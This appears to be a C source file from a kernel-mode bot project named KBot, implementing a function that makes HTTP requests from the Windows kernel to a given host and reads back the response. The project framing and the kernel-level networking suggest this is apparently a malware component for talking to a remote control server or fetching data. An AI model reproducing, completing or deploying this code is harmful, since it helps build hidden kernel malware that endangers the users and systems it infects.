//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KBot project.
//	
// module: sendrecv.c
// $Revision: 29 $
// $Date: 2012-05-30 11:47:28 +0400 (Ср, 30 май 2012) $
// description: 
//	Kernel-mode client program.
//	Send and receive data functions.

#include <Ntifs.h>
#include <ntddk.h>
#include <ntimage.h>
#define NTSTRSAFE_NO_DEPRECATE
#include <ntstrsafe.h>

#include "version.h"
#include "ntddkex.h"
#include "kdbg.h"

#include "inaddr.h"
#include "kipapi.h"
#include "..\khttp\khttp.h"

#include "..\kiplib\kstream.h"

#include "kbot.h"
#include "kbotinc.h"

NTSTATUS	KBotRequest(
	IN	PCHAR	Host,
	IN	PCHAR	Uri,
	IN	PCHAR	Method,
	OUT	PCHAR*	pBuffer,
	OUT	PULONG	pSize
	)
{
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	HANDLE		hSession = 0, hConnect = 0, hRequest = 0;
	PKSTREAM	pStream = NULL;
	PCHAR		Buffer = NULL;

	KdPrint(("KBOT: request \"%s %s%s\"\n", Method, Host, Uri));

	do	// not a loop 
	{
		ULONG	Status = 0, sLen = sizeof(ULONG), Total = 0;
		BOOL	Ret;

		if (!(Buffer = KBotAlloc(KBOT_CONTENT_BUFFER_SIZE)))
			break;

		if (!(pStream = KStreamAllocate()))
			break;

		if (!(hSession = KHttpOpen(g_KbotUserAgent, 0, NULL, NULL, 0)))
			break;

		if (!(hConnect = KHttpConnect(hSession, Host, KHTTP_DEFAULT_HTTP_PORT, 0)))
		{
			ntStatus = STATUS_CONNECTION_REFUSED;
			break;
		}

		ntStatus = STATUS_REQUEST_NOT_ACCEPTED;

		if (!(hRequest = KHttpOpenRequest(hConnect, Method, Uri, NULL, NULL, NULL, 0)))
			break;

		if (!(Ret = KHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)))
			break;

		if (!(Ret = KHttpReceiveResponse(hRequest, NULL)))
			break;

		if (!KHttpQueryHeaders(hRequest, KHTTP_QUERY_STATUS_CODE, NULL, &Status, &sLen, NULL))
			break;

		if (Status != KHTTP_STATUS_OK)
			break;
		
		while(KHttpReadData(hRequest, Buffer, KBOT_CONTENT_BUFFER_SIZE, &sLen) && sLen != 0)
		{
			KStreamWrite(pStream, Buffer, sLen);
			Total += sLen;
		}

		KBotFree(Buffer);

		if (sLen = KStreamGetLength(pStream))
		{
			if (!(Buffer = KBotAlloc(sLen + 1)))
				break;

			KStreamRead(pStream, Buffer, sLen);
			Buffer[sLen] = 0;

			*pBuffer = Buffer;
		}	// if (sLen = KStreamGetLength(pStream))

		*pSize = sLen;
		ntStatus = STATUS_SUCCESS;

	} while(FALSE);

	if (hRequest)
		KHttpCloseHandle(hRequest);
	if (hConnect)
		KHttpCloseHandle(hConnect);
	if (hSession)
		KHttpCloseHandle(hSession);
	if (pStream)
		KStreamRelease(pStream);

	if (!NT_SUCCESS(ntStatus))
		KBotFree(Buffer);

	KdPrint(("KBOT: request ended with status 0x%x\n", ntStatus));

	return(ntStatus);
}
